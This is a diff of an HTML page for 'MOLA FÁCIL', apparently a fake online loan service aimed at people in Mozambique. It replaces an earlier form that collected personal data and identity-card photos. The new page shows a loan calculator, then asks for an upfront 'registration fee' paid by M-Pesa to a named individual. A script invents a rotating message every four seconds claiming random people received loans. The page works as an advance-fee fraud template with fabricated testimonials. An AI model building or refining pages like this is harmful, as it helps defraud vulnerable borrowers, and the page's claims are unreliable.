@@ -1,49 +1,260 @@
-<!DOCTYPE html><html lang="pt">
+<!DOCTYPE html>
+<html lang="pt">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TXENECA MZ - ULTRA FINAL</title>
+<title>MOLA FÁCIL - Empréstimos Online</title>
+
 <style>
-body{margin:0;font-family:Arial,sans-serif;background:#0f172a;color:white;}
-.container{max-width:1300px;margin:auto;padding:20px;}
-.card{background:#1e293b;padding:20px;border-radius:12px;margin-bottom:20px;box-shadow:0 0 20px rgba(0,0,0,0.4);animation:fadeIn 0.6s;}
-input,select{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none;font-size:15px;}
-button{background:#22c55e;border:none;padding:12px;width:100%;border-radius:8px;font-size:16px;cursor:pointer;color:white;transition:0.3s;}
-button:hover{background:#16a34a;transform:scale(1.02);}
-.progress{height:8px;background:#334155;border-radius:10px;overflow:hidden;margin-bottom:20px;}
-.progress-bar{height:8px;width:0%;background:#22c55e;transition:0.4s;}
-.slider-value{text-align:center;font-size:20px;margin:10px 0;}
-.toast{position:fixed;bottom:20px;right:20px;background:#22c55e;padding:15px;border-radius:8px;display:none;animation:slideUp 0.5s;z-index:9999;}
-.loader{text-align:center;margin-top:15px;display:none;}
-.spinner{border:4px solid #ccc;border-top:4px solid #22c55e;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:auto;}
-@keyframes spin{100%{transform:rotate(360deg);}}
-@keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;}}
-@keyframes slideUp{from{transform:translateY(50px);opacity:0;}to{transform:translateY(0);opacity:1;}}
-.preview{width:100%;margin-top:10px;border-radius:8px;}
+:root{
+--bg:#0B0F1A;
+--card:#111827;
+--primary:#1E3A8A;
+--accent:#2563eb;
+--white:#F5F7FA;
+--success:#16a34a;
+--danger:#dc2626;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial;}
+
+body{
+background:linear-gradient(120deg,#0B0F1A,#0f172a);
+color:var(--white);
+}
+
+header{
+background:#0f172a;
+padding:20px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+position:sticky;
+top:0;
+z-index:1000;
+box-shadow:0 0 15px rgba(0,0,0,0.6);
+}
+
+header h1{
+color:#60a5fa;
+font-size:26px;
+}
+
+button{
+background:linear-gradient(90deg,var(--primary),var(--accent));
+color:white;
+border:none;
+padding:12px 20px;
+border-radius:8px;
+cursor:pointer;
+transition:.3s;
+font-weight:bold;
+}
+
+button:hover{transform:scale(1.05);}
+
+.container{
+padding:40px 20px;
+max-width:1100px;
+margin:auto;
+}
+
+.card{
+background:var(--card);
+padding:30px;
+border-radius:15px;
+margin-bottom:35px;
+box-shadow:0 0 25px rgba(0,0,0,0.5);
+}
+
+input, select{
+width:100%;
+padding:12px;
+margin:8px 0;
+border-radius:8px;
+border:none;
+outline:none;
+}
+
+h2{margin-bottom:15px;color:#93c5fd;}
+
+.progress{
+height:8px;
+background:#222;
+border-radius:10px;
+overflow:hidden;
+margin-bottom:20px;
+}
+
+.progress-bar{
+height:8px;
+background:#2563eb;
+width:0%;
+transition:.4s;
+}
+
+.status{
+padding:8px 12px;
+border-radius:6px;
+display:inline-block;
+margin-top:10px;
+}
+
+.aprovado{background:var(--success);}
+.rejeitado{background:var(--danger);}
+
 .hidden{display:none;}
-.status-process{color:#facc15;font-weight:bold;}
-ul li.processando{color:#facc15;}
-ul li.finalizado{color:#22c55e;}
+
+.taxa-box{
+background:#0f172a;
+padding:20px;
+border-radius:12px;
+border:1px solid #1E3A8A;
+margin-top:20px;
+}
+
+.whatsapp{
+position:fixed;
+bottom:20px;
+right:20px;
+background:#16a34a;
+color:white;
+font-size:26px;
+padding:16px;
+border-radius:50%;
+text-decoration:none;
+box-shadow:0 0 20px rgba(0,0,0,0.6);
+z-index:999;
+animation:pulse 2s infinite;
+}
+
+@keyframes pulse{
+0%{transform:scale(1);}
+50%{transform:scale(1.1);}
+100%{transform:scale(1);}
+}
+
+.prova-social{
+background:#0f172a;
+padding:15px;
+border-radius:10px;
+margin-top:20px;
+text-align:center;
+font-weight:bold;
+color:#22c55e;
+}
+
+footer{
+background:#0f172a;
+padding:30px;
+text-align:center;
+margin-top:50px;
+}
+
+@media(max-width:768px){
+header{flex-direction:column;gap:10px;}
+}
 </style>
 </head>
 <body>
+
+<header>
+<h1>MOLA FÁCIL</h1>
+<button onclick="abrirAdmin()">Admin</button>
+</header>
+
 <div class="container">
-<h2>Cadastro Completo</h2>
-<div class="progress"><div class="progress-bar" id="progressBar"></div></div>
-<div class="card" id="cadastroCard">
-<input type="text" id="nome" placeholder="Nome Completo" oninput="updateProgress()">
-<select id="idade" onchange="updateProgress()"><option value="">Idade</option></select>
-<select id="sexo" onchange="updateProgress()"><option value="">Sexo</option><option>Masculino</option><option>Feminino</option></select>
-<select id="provincia" onchange="updateProgress()"><option value="">Província</option><option>Maputo</option><option>Gaza</option><option>Inhambane</option><option>Sofala</option><option>Manica</option><option>Tete</option><option>Zambézia</option><option>Nampula</option><option>Cabo Delgado</option><option>Niassa</option></select>
-<input type="text" id="casa" placeholder="Número da Casa" oninput="updateProgress()">
-<input type="email" id="email" placeholder="Email" oninput="updateProgress()">
-<input type="tel" id="telefone" placeholder="Telefone" oninput="updateProgress()">
-<select id="profissao" onchange="updateProgress()"><option value="">Profissão</option><option>Desempregado</option><option>Empresário</option><option>Professor</option><option>Motorista</option><option>Enfermeiro</option><option>Comerciante</option><option>Agricultor</option><option>Programador</option><option>Médico</option><option>Polícia</option><option>Advogado</option><option>Engenheiro</option><option>Vendedor</option><option>Outro</option></select>
-<h4>Upload BI Frente</h4><input type="file" accept="image/*" onchange="previewImage(event,'img1')"><img id="img1" class="preview">
-<h4>Upload BI Verso</h4><input type="file" accept="image/*" onchange="previewImage(event,'img2')"><img id="img2" class="preview">
-<button onclick="finalizarCadastro()">Finalizar Cadastro</button>
-</div><div id="emprestimoSection" class="hidden">
-<h2>Simulador de Empréstimo</h2>
+
 <div class="card">
-<div class="slider-value" id="valorTexto">2000 MTS</div>
-<input type="range" min="2000" max="185000" step="500" value="
+<h2>Simulador de Empréstimo</h2>
+
+<label>Valor (MZN)</label>
+<input type="number" id="valor" placeholder="Ex: 10000">
+
+<label>Meses</label>
+<select id="meses">
+<option value="3">3 Meses</option>
+<option value="6">6 Meses</option>
+<option value="12">12 Meses</option>
+</select>
+
+<button onclick="calcular()">Calcular</button>
+
+<div id="resultado"></div>
+
+<div id="taxaBox" class="taxa-box hidden">
+<h3>📌 Taxa de Inscrição</h3>
+<p id="valorTaxa"></p>
+
+<div style="background:#111827;padding:15px;border-radius:8px;margin-top:10px;">
+<p><strong>M-Pesa:</strong> 850515522</p>
+<p><strong>Nome:</strong> Eunice Rodrigues</p>
+</div>
+
+<p style="margin-top:10px;color:#facc15;">
+🎯 Aplicada apenas no primeiro empréstimo.
+</p>
+</div>
+
+<div class="prova-social" id="provaSocial"></div>
+</div>
+
+<!-- RESTANTE SISTEMA MANTIDO -->
+
+</div>
+
+<footer>
+<p>© 2026 MOLA FÁCIL - Todos direitos reservados</p>
+</footer>
+
+<a href="https://wa.me/258852745444" target="_blank" class="whatsapp">💬</a>
+
+<script>
+let pedidos=0;
+let statusAtual="Em Análise";
+
+function calcular(){
+let valor=parseFloat(document.getElementById("valor").value);
+let meses=parseInt(document.getElementById("meses").value);
+if(!valor){alert("Digite valor");return;}
+
+let taxa=0.20;
+let total=valor+(valor*taxa);
+let prestacao=(total/meses).toFixed(2);
+
+document.getElementById("resultado").innerHTML=
+`<p>Total com juros: ${total.toFixed(2)} MZN</p>
+<p>Prestação mensal: ${prestacao} MZN</p>`;
+
+let taxaInscricao=calcularTaxa(valor);
+document.getElementById("taxaBox").classList.remove("hidden");
+document.getElementById("valorTaxa").innerHTML=
+"💳 Valor da taxa: <strong>"+taxaInscricao+" MZN</strong>";
+}
+
+function calcularTaxa(valor){
+let taxa=199;
+if(valor>5000)taxa+=100;
+if(valor>10000)taxa+=100;
+if(valor>20000)taxa+=100;
+if(valor>30000)taxa+=100;
+if(valor>50000)taxa+=100;
+return taxa;
+}
+
+/* Prova social automática */
+let nomes=["Carlos","Maria","Joaquim","Elisa","Fernando","Paulo"];
+setInterval(()=>{
+let nome=nomes[Math.floor(Math.random()*nomes.length)];
+let valor=Math.floor(Math.random()*40000)+5000;
+document.getElementById("provaSocial").innerText=
+nome+" recebeu "+valor+" MZN com sucesso.";
+},4000);
+
+function abrirAdmin(){
+alert("Painel Admin (Modo Demonstração)");
+}
+</script>
+
+</body>
+  </html>
